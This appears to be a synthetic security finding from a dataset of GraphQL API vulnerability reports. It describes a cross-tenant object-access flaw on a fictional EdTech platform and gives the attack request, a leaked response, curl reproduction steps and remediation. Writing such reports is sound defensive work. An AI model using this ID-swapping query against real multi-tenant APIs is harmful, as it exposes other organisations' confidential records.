# Security Analysis Report
**System:** LearnPath Assessment Platform
**Domain:** Education / EdTech LMS
**Example ID:** GQL-0266
**Artifact analyzed:** context.txt (sole source)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | HIGH | BOLA — Pattern 1.2 | Related or linked resources on `getResource` — attacker reads assessment records belonging to another tenant |

---

## Finding 1 — BOLA: Related/Linked Resource Access Without Ownership Check (Pattern 1.2)

### Summary
The GraphQL API at `https://api.learnpath-assessment.example.com/graphql` exposes a `getResource` resolver that fetches by `resourceId` without verifying the JWT `tenantId` claim matches the object's `tenantId`. Per RISK-GQL-266, the Redis cache is keyed only by `resourceId` (no user dimension). An attacker with a valid token for their own tenant can query linked/related assessment resources belonging to `tenant-ad3c` by providing a known `resourceId`.

**Note:** `x-request-id: req-60c9ad3c` is a server-assigned response header; it does not appear in the outgoing request. The HAR request and response both use `getResource` — no inconsistency in operation name.

**Pattern:** 1.2 — Related or linked resources (BOLA)
**Affected endpoint:** `POST https://api.learnpath-assessment.example.com/graphql`

### Evidence from HAR (§6.0)

**Request — Attack**
```
POST https://api.learnpath-assessment.example.com/graphql
Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG
Content-Type: application/json

{"query":"query VulnerableOp { getResource(id: \"R-2266\") { resourceId tenantId ownerId data { sensitiveField internalNotes } } }"}
```

**Response — Victim Assessment Record**
```json
{
  "data": {
    "getResource": {
      "tenantId": "tenant-ad3c",
      "ownerId": "other-user-60c9ad3c",
      "data": {
        "sensitiveField": "CONFIDENTIAL-60c9ad3c",
        "internalNotes": "Internal data exposed"
      }
    }
  }
}
```

### Steps to Reproduce
```bash
TOKEN="eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG"
curl -s -X POST "https://api.learnpath-assessment.example.com/graphql" \
  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d '{"query":"query VulnerableOp { getResource(id: \"R-2266\") { resourceId tenantId ownerId data { sensitiveField internalNotes } } }"}'
# Vulnerable: tenantId: tenant-ad3c, sensitiveField: CONFIDENTIAL-60c9ad3c
# Secure: {"errors":[{"message":"Forbidden"}]}
```

### Remediation
1. Resolver must compare `object.tenantId` against `jwt.tenantId` claim before returning data.
2. Redis cache key must include user/tenant dimension: `resource:{tenantId}:{resourceId}`.
3. Linked/related resource traversal must enforce the same ownership check on all linked nodes.
